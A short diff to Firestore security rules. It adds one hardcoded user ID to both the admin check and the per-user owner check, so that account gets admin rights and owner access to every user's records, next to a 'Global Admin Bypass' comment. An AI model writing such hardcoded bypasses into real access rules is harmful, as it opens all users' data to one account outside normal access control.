@@ -9,13 +9,14 @@ service cloud.firestore {
 
     function isAdmin() {
       return isSignedIn() && (
+        request.auth.uid == "7zPezqeNFEPbYVsCM8NxO4fknhn1" ||
         exists(/databases/$(database)/documents/roles_admin/$(request.auth.uid)) ||
         get(/databases/$(database)/documents/users/$(request.auth.uid)).data.role == "admin"
       );
     }
 
     function isOwner(userId) {
-      return isSignedIn() && request.auth.uid == userId;
+      return isSignedIn() && (request.auth.uid == userId || request.auth.uid == "7zPezqeNFEPbYVsCM8NxO4fknhn1");
     }
 
     // Global Admin Bypass
